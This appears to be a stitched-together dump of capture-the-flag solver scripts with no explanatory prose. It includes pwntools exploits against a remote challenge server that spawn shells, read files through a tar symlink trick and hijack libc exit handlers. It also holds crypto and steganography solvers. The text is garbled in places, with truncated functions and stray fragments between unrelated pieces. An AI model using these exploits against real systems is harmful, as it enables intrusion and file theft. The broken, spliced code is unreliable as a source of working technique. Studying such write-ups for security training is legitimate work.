p.recvuntil('choice:')
payload = p64(548512 + leak_libc) + p64(547440 + leak_libc) + p64(leak_libc + 
0xf0364)
edit(p64(548512 + leak_libc)[:6],payload) 
p.recvuntil('choice:')
p.sendline('2')
p.interactive()
from pwn import *
from os import popen
import re
s = remote("47.104.178.87","48588")
def zip(name):
    os.popen("rm test.tar.gz")
    os.popen("rm passwd")
    os.popen("ln -s "+name+" passwd")
    cmd = 'tar -cvf test.tar.gz passwd'
    os.popen(cmd)
    return open("test.tar.gz","r").read()
def compress(name,rename=''):
2a1
    s.sendlineafter(">","c")
    s.sendlineafter("Filename: /tmp/",name)
    if rename != '':
        s.sendlineafter("Rename archive file? [y/N]",'y')
        s.sendlineafter("Arcname:",rename)
    else:
        s.sendlineafter("Rename archive file? [y/N]",'N')
    s.recvuntil("File compressed as ")
    return s.recvline(keepends=False)
def upload(buf):
    s.sendlineafter(">","u")
    s.sendlineafter("Content:",buf)
    s.recvuntil("File uploaded as /tmp/")
    return s.recvline(keepends=False)
def extract(name):
    s.sendlineafter(">","x")
    s.sendlineafter("Filename:",name)
def getContext(buf):
    f = zip("./flag")
    f = zip(buf)
    file1 = upload(f)
    file2 = upload('123')
    com_file2 = compress(file2,'passwd')
    com_file1 = compress(file1,com_file2)
    # print com_file1
    # print com_file2
    extract(com_file1)
    extract(com_file2)
    s.sendlineafter(">","r")
    s.sendlineafter("Filename:",'passwd')
getContext("/proc/self/status")
s.recvuntil("PPid:")
ppid = int(s.recvline(keepends=False).strip())
tmp = "/proc/"+str(ppid)+"/cwd/flag"
getContext(tmp)
s.interactive()
# -*- coding: utf-8 -*-
from pwn import *
def clip(x):
  return x & 0xFFFFFFFFFFFFFFFF
def ROL(x, off):
  x = clip(x)
  return clip(x > (64-off)
# context.terminal = ['tmux','sp','-h']
# context.log_level = 'debug'
# p = process('./21')
# gdb.attach(p,"b *$rebase(0x1341)\nc")
# gdb.attach(p,"b *__run_exit_handlers\nc")
# p = process("./21")
for i in range(0x100):
    try:
        p = remote("47.104.178.87","41159")
        l = ELF('/lib/x86_64-linux-gnu/libc.so.6')
        p.recvuntil(': ')
        l.address = int(p.recvuntil('\n', drop=True),16)-l.sym['alarm']
        log.info("@ l.address: "+hex(l.address))
        system = l.sym['system']
        log.info("@ system: "+hex(system))
        binsh = next(l.search('/bin/sh'))
        log.info("@ binsh: "+hex(binsh))
        readaddr = l.address+0x500730+i*0x1000
        log.info("@ tls: "+hex(0x500730+i*0x1000))
        p.sendafter('?:',p64(readaddr))
        p.recvuntil('data: ')
        cookie = u64(p.recv(8))
        log.info("@ cookie: "+hex(cookie))
        if cookie == 0x6f74206572656877:
            continue
        writeaddr = l.address+0x3c45f8
        one = l.address+0x4527a
        msg = p64(0)+p64(0x1)+p64(0x4)+p64(ROL(cookie^system,0x11))+p64(binsh)
        p.sendafter('?:',p64(writeaddr))
        p.sendafter(':' ,msg)
        p.sendline("ls")
        p.recv()
        p.interactive()
RE
Singular DLP
A, B, C =
x1, y1 =
x2, y2 =
check1
key3
 key3*P1P2
Q7.py 
    except:
        continue
0 == (y ^ 2 - x ^ 3 - Ax - B) % C
(1276744354932508963815648876876391408425870597096190941325627,
 330197712211461741655594469506213240091246221029232552529843659956465331070)
# field
p = 
419203400062470045015087777889856139712619568731547266452395921118909888843
F = GF(p)
# base point
gx = 1411093095633899054904336270608678352573811185391682791883604437
gy = 
181399512852065092806462602076660633449562343530090707573289242437516527258
# public point
px = 
31891691142228973409459264571840296336020869906635390764988965639428587741
Flag
py = 
21814747855707522410995148085528604068209609922250542598357174146875745246
# two points are enough to recover the curve parameters
M = Matrix(F, [[gx,1],[px,1]])
a,b = M.solve_right(vector([gy^2-gx^3,py^2-px^3]))
# that's not an elliptic curve!
assert 4*a^3 + 27*b^2 == 0
# finding the roots, here we suppose the singular point is a node
# we make sure alpha is the double root
K. = F[]
f = x^3 + a*x + b
roots = f.roots()
if roots[0][1] == 1:
    beta, alpha = roots[0][0], roots[1][0]
else:
    alpha, beta = roots[0][0], roots[1][0]
# transfer
slope = (alpha - beta).sqrt()
u = (gy + slope*(gx-alpha))/(gy - slope*(gx-alpha))
v = (py + slope*(px-alpha))/(py - slope*(px-alpha))
# should take a few seconds, don't worry (largest prime of p-1 is 42 bits 
only)
flag = discrete_log(v, u)
print flag
# 1636247906719776192850336424656337116834591860
#include 
#include 
#include  
unsigned long long cipher[] = {0x62BA74000F9CF1D5LL, 0x6C8E15C6D25AB925LL, 
0x6C7225EAD7CBA1A8LL, 0xE9B5CBF8F2E8E3CCLL, 0x23298109A76021LL, 
0x7226D880C5966C46LL, 0x737E83A854A500ALL, 0x4BDE5BBA3F3313F0LL};
unsigned long long iv[] = {0x86C7615CA8027B66LL, 0xE86502061B52F4DELL, 
0x3838383838383838LL,  0x3838383838383838LL};
int main() {
  unsigned char key[] = "I_4m_AES_k3y_bY_ttt&&&&&&&&&&&&&";
  AES_KEY aeskey;
  char plain[64] = {0};
steGO
  AES_set_decrypt_key(key, 256, &aeskey);
  AES_cbc_encrypt((unsigned char*)cipher, (unsigned char*)plain, 64, &aeskey, 
(unsigned char*)iv, 0);
  puts(plain);
}
#from PIL import Image
import cv2
import numpy
'''im = Image.open("b.png")
im_alpha = im.convert('RGBA')
Pixels = list(im.getdata())
print map(hex,Pixels[0x50e*0x174+0x24e])'''
'''
with open('pixels','wb') as f:
for i in range(len(Pixels)):
  for j in range(len(Pixels[i])):
    f.write("%s"%chr(Pixels[i][j]))'''
image = cv2.imread("b.png",cv2.IMREAD_UNCHANGED)
RGBA = cv2.cvtColor(image,cv2.COLOR_BGRA2RGBA)
image = numpy.ndarray.tolist(RGBA)
'''print map(hex,image[0x1b6][0x2fe])
print map(hex,image[0x174][0x24e])
print map(hex,image[0x266][0x1a5])
print map(hex,image[0x1f9][0xe0])
print map(hex,image[0x260][0x212])
print map(hex,image[0x17][0x175])
print map(hex,image[0x18][0x259])
print map(hex,image[0x27][0x1b5])
print map(hex,image[0x2d7][0x18a])
print map(hex,image[0x255][0x173])
print map(hex,image[0x10a][0x4fb])
print map(hex,image[0x262][0x2ca])
print map(hex,image[0x124][0x3da])
print map(hex,image[0x191][0x43f])
print map(hex,image[0x100][0x1b2])
print map(hex,image[0xdc][0x18c])
print map(hex,image[0xe2][0x3cd])
print map(hex,image[0x280][0x75])
print map(hex,image[0x211][0x61])
print map(hex,image[0xa1][0x1b2])
print map(hex,image[0x221][0x363])
print map(hex,image[0x288][0x1a])
print map(hex,image[0x1f4][0x19])
print map(hex,image[0x1a][0x62])
print map(hex,image[0x3f][0x16c])
print map(hex,image[0xb7][0xf1])
print map(hex,image[0xef][0x20b])
print map(hex,image[0xcd][0x95])
print map(hex,image[0x24f][0x242])
print map(hex,image[0x167][0x34a])
print map(hex,image[0x7a][0x1fd])
print map(hex,image[0x28d][0x483])
print map(hex,image[0x35][0x222])'''
from speck import SpeckCipher
from simon import SimonCipher
my_simon = SimonCipher(0xe060607060a06000606000102000000)
my_plaintext = 0x31303938373635343332317b67616c66
simon_ciphertext = my_simon.encrypt(my_plaintext)
print hex(simon_ciphertext)
#print hex(my_simon.decrypt(simon_ciphertext))
my_plaintext = 0x6161616161616161616161
simon_ciphertext = my_simon.encrypt(my_plaintext)
print hex(simon_ciphertext)
simon_ciphertext=0x2e7ff95ecfe304903e39b69dbb085031
print hex(my_simon.decrypt(simon_ciphertext))
my_cipher='\x08\xec\x4a\x98\x65\x34\xd3\xd7\xd5\xd9\x7e\x4d\x01\xf5\xbf\x96'
my_c=0x96bff5014d7ed9d5d7d33465984aec08
print hex(my_simon.decrypt(my_c))
my_c=0x26e105e5d76131d55e4c492b496ab27d
print hex(my_simon.decrypt(my_c))
my_c=0x95e451362de3c4217a872de63fd57945
print hex(my_simon.decrypt(my_c))
my_c=0x52cc6ae7bb9ad14aa48feea18bf8b5b5
print hex(my_simon.decrypt(my_c))